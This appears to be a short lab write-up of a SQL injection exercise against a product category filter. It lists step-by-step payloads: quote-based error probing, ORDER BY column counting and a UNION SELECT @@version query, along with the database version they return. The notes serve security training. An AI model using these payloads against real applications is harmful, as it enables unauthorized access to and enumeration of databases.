Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Vuln : SQLI in product category Filter
Task : Display DB version of mysql and Microsoft

'-> HTTP/2 500 Internal Server Error
' order by 1-- -> OK
' order by 2-- -> OK
' order by 3-- -> HTTP/2 500 Internal Server Error

2 cloumns in DB.

' union select 'a',null-- : OK
' union select @@version,null-- : return version of mysql and microsoft DB
`8.0.39-0ubuntu0.20.04.1`
